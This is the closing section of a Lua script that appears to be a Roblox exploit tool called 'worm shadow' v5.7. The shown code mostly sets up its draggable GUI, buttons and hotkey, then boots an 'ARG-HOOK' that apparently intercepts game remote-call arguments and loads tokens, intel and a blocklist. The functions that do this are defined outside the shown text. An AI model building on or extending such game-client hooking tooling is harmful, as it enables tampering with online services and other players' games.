function dragify(frame) local dr,di,ds,sp=false,nil,nil,nil frame.InputBegan:Connect(function(input) if input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch then local f=S.UserInput:GetFocusedTextBox() if f then return end dr=true ds=input.Position sp=frame.Position input.Changed:Connect(function() if input.UserInputState==Enum.UserInputState.End then dr=false end end) end end) frame.InputChanged:Connect(function(input) if input.UserInputType==Enum.UserInputType.MouseMovement or input.UserInputType==Enum.UserInputType.Touch then di=input end end) S.UserInput.InputChanged:Connect(function(input) if input==di and dr then local f=S.UserInput:GetFocusedTextBox() if f then dr=false return end local d=input.Position-ds frame.Position=UDim2.new(sp.X.Scale,sp.X.Offset+d.X,sp.Y.Scale,sp.Y.Offset+d.Y) end end) end
dragify(Main)
dragify(Mini)
CloseBtn.MouseButton1Click:Connect(function() GUI:Destroy() end)
MinBtn.MouseButton1Click:Connect(function() Main.Visible=false Mini.Visible=true end)
Mini.MouseButton1Click:Connect(function() Main.Visible=true Mini.Visible=false end)
S.UserInput.InputBegan:Connect(function(input,gpe) if gpe then return end if input.KeyCode==Enum.KeyCode.LeftAlt then Main.Visible=not Main.Visible Mini.Visible=not Mini.Visible end end)
task.spawn(function() task.wait(0.5) local ok,err=wsEnableArgHook(true) if ok then ArgHookBtn.Text="ARG-HOOK: ON" ArgHookBtn.TextColor3=C.Acc log("arg hook enabled") else ArgHookBtn.Text="ARG-HOOK: N/A" ArgHookBtn.TextColor3=C.Mute log("hook unsupported") end updateInfo() end)
task.spawn(function() task.wait(0.7) pcall(deriveTokens) pcall(loadIntel) pcall(loadBlocklist) log("intel loaded") updateInfo() end)
switchTab("SCAN")
setStatus("ready - v5.7",C.Mute)
updateInfo()
log("v5.7 booted")
notify("worm shadow","v5.7 loaded",5)
print("[WS] fully loaded")
end)
if not __bootOK then print("[WS] BOOT FAILED:",__bootErr) __showError(__bootErr) else print("[WS] BOOT OK") end
